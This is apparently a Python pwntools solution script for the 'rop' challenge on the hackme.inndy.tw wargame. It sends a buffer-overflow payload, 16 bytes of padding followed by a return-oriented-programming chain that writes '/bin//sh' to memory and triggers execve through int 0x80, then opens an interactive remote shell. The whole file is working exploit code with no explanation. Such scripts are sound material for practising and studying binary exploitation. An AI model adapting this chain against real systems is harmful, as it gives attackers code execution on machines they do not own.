# -*- coding: utf-8 -*-

#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'Flyour'


from pwn import *
from struct import pack

context(terminal=['gnome-terminal', '-x', 'sh', '-c'], arch='i386', os='linux', log_level='debug')

def debug(addr='0x0804892b'):
    raw_input('debug:')
    gdb.attach(io, "b *" + addr)

elf = ELF('./rop')

# io = process('./rop')
io = remote('hackme.inndy.tw', 7704)

# debug()


# Padding goes here
p = 'a' * 16

p += pack('<I', 0x0806ecda)  # pop edx ; ret
p += pack('<I', 0x080ea060)  # @ .data
p += pack('<I', 0x080b8016)  # pop eax ; ret
p += '/bin'
p += pack('<I', 0x0805466b)  # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806ecda)  # pop edx ; ret
p += pack('<I', 0x080ea064)  # @ .data + 4
p += pack('<I', 0x080b8016)  # pop eax ; ret
p += '//sh'
p += pack('<I', 0x0805466b)  # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806ecda)  # pop edx ; ret
p += pack('<I', 0x080ea068)  # @ .data + 8
p += pack('<I', 0x080492d3)  # xor eax, eax ; ret
p += pack('<I', 0x0805466b)  # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080481c9)  # pop ebx ; ret
p += pack('<I', 0x080ea060)  # @ .data
p += pack('<I', 0x080de769)  # pop ecx ; ret
p += pack('<I', 0x080ea068)  # @ .data + 8
p += pack('<I', 0x0806ecda)  # pop edx ; ret
p += pack('<I', 0x080ea068)  # @ .data + 8
p += pack('<I', 0x080492d3)  # xor eax, eax ; ret
p += pack('<I', 0x0807a66f)  # inc eax ; ret
p += pack('<I', 0x0807a66f)  # inc eax ; ret
p += pack('<I', 0x0807a66f)  # inc eax ; ret
p += pack('<I', 0x0807a66f)  # inc eax ; ret
p += pack('<I', 0x0807a66f)  # inc eax ; ret
p += pack('<I', 0x0807a66f)  # inc eax ; ret
p += pack('<I', 0x0807a66f)  # inc eax ; ret
p += pack('<I', 0x0807a66f)  # inc eax ; ret
p += pack('<I', 0x0807a66f)  # inc eax ; ret
p += pack('<I', 0x0807a66f)  # inc eax ; ret
p += pack('<I', 0x0807a66f)  # inc eax ; ret
p += pack('<I', 0x0806c943)  # int 0x80

io.send(p)
io.interactive()

io.close()
